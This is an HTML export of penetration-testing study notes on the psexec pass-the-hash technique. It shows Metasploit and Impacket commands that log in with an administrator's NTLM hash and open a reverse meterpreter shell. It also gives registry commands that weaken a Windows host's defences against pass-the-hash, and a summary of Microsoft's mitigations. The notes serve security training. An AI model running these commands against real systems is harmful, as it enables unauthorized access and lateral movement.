<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>psexec</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>psexec</h1><br /><br /><strong>
      <h3>Prerequisite:</h3>
    </strong><br />• NTLM hash &amp; user<br /><br /><strong>
      <h3>Metasploit’s PsExec exploit module supports pass-the-hash capabilities</h3>
    </strong><br /><a
      href="file://C:/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/psexec.png"><img
        src="images/860-1.png" alt="images/860-1.png" /></a><br />The psexec module is often used by penetration testers
    to obtain access to a given system that you already know the hashed credentials without cracking it.<br />With this
    module we can authenticate to the target machine via SMB with Metasploit(msf) <span
      style="text-decoration:underline;">as an admin user with only that admin&#39;s hash</span><br /> ◇ <span
      style="text-decoration:underline;">Metasploit psexec</span><br />
    <div class="codebox">
      <div class="codebox">
        msf&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/smb/psexec<br />msf&nbsp;&gt;&nbsp;set&nbsp;RHOST&nbsp;[victims]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#we&nbsp;can&nbsp;set&nbsp;more&nbsp;machines(range)&nbsp;in&nbsp;the&nbsp;network&nbsp;and&nbsp;test&nbsp;to&nbsp;&quot;pass&nbsp;the&nbsp;hash&quot;&nbsp;on&nbsp;them<br />msf&nbsp;&gt;&nbsp;set&nbsp;LHOST&nbsp;[your_linux_ip_address]<br />msf&nbsp;&gt;&nbsp;set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp<br />msf&nbsp;&gt;&nbsp;set&nbsp;SMBUser&nbsp;[admin_name]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#admin&nbsp;username<br />msf&nbsp;&gt;&nbsp;set&nbsp;SMBPass&nbsp;[LANMAN]:[NT]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#administrator&#39;s&nbsp;hash&nbsp;in&nbsp;LM:NT&nbsp;format<br />msf&nbsp;&gt;&nbsp;show&nbsp;options&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;review&nbsp;the&nbsp;settings&nbsp;for&nbsp;our&nbsp;attack<br />msf&nbsp;&gt;&nbsp;db_disconnect&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#at&nbsp;the&nbsp;time&nbsp;that&nbsp;we&nbsp;write&nbsp;there&nbsp;is&nbsp;a&nbsp;bug&nbsp;in&nbsp;msf,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;exploit&nbsp;we&nbsp;need&nbsp;to&nbsp;disconnect&nbsp;the&nbsp;database<br />msf&nbsp;&gt;&nbsp;exploit
      </div>
    </div><br /> Metasploit&#39;s PsExec exploit can realize that we are using a hash here instead of a password and
    launch its attack using pass-the-hash, making the target run the Metasploit payload<br /> If the pass-the-hash
    attack works successfully, you should get Meterpreter access to the target machine.<br /> ◇ <span
      style="text-decoration:underline;">Python3 psexec</span><br />
    <div class="codebox">
      <div class="codebox">
        kali@kali:~$&nbsp;cd&nbsp;/usr/share/doc/python3-impacket/examples/<br />kali@kali:~$&nbsp;psexec.py&nbsp;&lt;FQDN&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ipAddress&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#with&nbsp;clear&nbsp;password<br />kali@kali:~$&nbsp;python3&nbsp;psexec.py&nbsp;&lt;user&gt;@&lt;ipAddress&gt;&nbsp;-hashes&nbsp;&lt;LM:NTLM&gt;&nbsp;&nbsp;#with&nbsp;hashes
      </div>
    </div><br /> <a href=""><img src="images/860-2.png" alt="images/860-2.png" /></a><br /> <a href=""><img
        src="images/860-3.png" alt="images/860-3.png" /></a><br /> <br /><br /><strong>
      <h3>Possible error messages:</h3>
    </strong><br />• <span style="color:#ff0000;">&quot;Exploit failed: ActiveRecord … Data has already been
      taken“</span><br />That is due to a bug in the Metasploit database feature and its interaction with credentials.
    You can bypass that problem by disconnecting from the database by typing &quot;db_disconnect” and then try to
    exploit it again.<br /><br />• <span style="color:#ff0000;">“Exploit failed [no-access]:
      Rex::Proto::SMB::Exceptions::ErrorCode.......STATUS_ACCESS_DENIED (Command=117 WordCount=0)
      error”</span><br />That error occur when we try to access with a user that is in the Administrators group, but is
    not an “actual” administrator(RID-500). <br />This because Microsoft released a patch for Windows 7 and Server 2008
    to prevent the ability to pass-the-hash with non-RID 500 local administrator accounts<br />Here the article: <a
      href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" target="_blank">https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/</a><br />A
    summary of the article is done below in &quot;Microsoft&#39;s Pass-the-Hash Mitigations&quot;<br />This happen
    because of two settings in the registry value, <br />The registry key that make the Windows system MORE
    vulnerable:<br />
    <div class="codebox">
      <div class="codebox">
        HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy&nbsp;&nbsp;&nbsp;#set&nbsp;the&nbsp;DWORD&nbsp;(32-bit)&nbsp;to&nbsp;1<br />HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#set&nbsp;the&nbsp;DWORD&nbsp;(32-bit)&nbsp;to&nbsp;0
      </div>
    </div><br /> <strong>LocalAccountTokenFilterPolicy</strong> → set to 1 allow non RID-500 user accounts (for example
    users in the local administrator) to successfully pass-the-hash<br />To modify these values we have different
    possibilities:<br />• reg (meterpreter command):<br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;reg&nbsp;setval&nbsp;-k&nbsp;“HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System”&nbsp;-v&nbsp;LocalAccountTokenFilterPolicy&nbsp;-t&nbsp;REG_DWORD&nbsp;-d&nbsp;1<br />meterpreter&nbsp;&gt;&nbsp;reg&nbsp;setval&nbsp;-k&nbsp;“HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters”&nbsp;-v&nbsp;RequireSecuritySignature&nbsp;-t&nbsp;REG_DWORD&nbsp;-d&nbsp;0
      </div>
    </div><br />• reg (cmd command)(<a href="https://ss64.com/nt/reg.html" target="_blank">https://ss64.com/nt/reg.html</a>):<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;reg&nbsp;add&nbsp;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System&nbsp;/v&nbsp;LocalAccountTokenFilterPolicy&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;1&nbsp;/f<br />C:\&gt;&nbsp;reg&nbsp;add&nbsp;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters&nbsp;/v&nbsp;RequireSecuritySignature&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;0&nbsp;/f
      </div>
    </div><br /> ◇ To query the value of the registry keys<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;reg&nbsp;query&nbsp;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System&nbsp;/v&nbsp;LocalAccountTokenFilterPolicy<br />C:\&gt;&nbsp;reg&nbsp;query&nbsp;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters&nbsp;/v&nbsp;RequireSecuritySignature
      </div>
    </div><br />• Set-ItemProperty (powershell command):<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;Set-ItemProperty&nbsp;-Path&nbsp;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&nbsp;-Name&nbsp;LocalAccountTokenFilterPolicy&nbsp;-Value&nbsp;1&nbsp;-Type&nbsp;DWord<br />PS&gt;&nbsp;Set-ItemProperty&nbsp;-Path&nbsp;HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters&nbsp;–Name&nbsp;RequireSecuritySignature&nbsp;–Value&nbsp;0&nbsp;–Type&nbsp;DWord
      </div>
    </div><br /><br /><br /><strong>
      <h3>Microsoft&#39;s Pass-the-Hash Mitigations</h3>
    </strong><br />Microsoft has released several patches in an attempt to mitigate pass-the hash attacks but it is a
    fundamentally part of internal network authentication protocols (LM C/R, NTLMv1, NTLMv2, Kerberos) and cannot be
    patched.<br /><strong>Patches:</strong><br /> ◇ <a
      href="https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2016/2871997?redirectedfrom=MSDN" target="_blank">Microsoft
      Security Advisory 2871997</a> KB2871997 patch (released May 2014): Available patch for Windows 7/Server 2008 R2
    and incorporated by default from Windows 8.1<br /> ▪ Adds two security identifiers (SIDs)<br /> - local accounts →
    S-1-5-113 (NT AUTHORITY\Local account) <br /> - local admins → S-1-5-114 (NT AUTHORITY\Local account and member of
    Administrators group)<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;WMIC&nbsp;useraccount&nbsp;get&nbsp;name,sid&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#list&nbsp;of&nbsp;users&nbsp;an&nbsp;their&nbsp;SID
      </div>
    </div><br /> ▪ Via Group Policy, you can restrict all remote administration using local accounts<br /> ◇ Windows
    Defender Credential Guard: Available only for Windows 10 and Server 2016/2019<br /> ▪ Isolates secrets (Local
    Security Authority Subsystem Service / lsass.exe) from the operating system using virtualization technology, Secure
    Boot, and Trusted Platform Module<br /> ▪ Credential Guard isn’t a defense against passing the hash, it’s a defense
    against attackers gaining access to hashes in the first place<br /><br />Bibliography:<br />• <a
      href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" target="_blank">https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/</a>
  </div>
</body>

</html>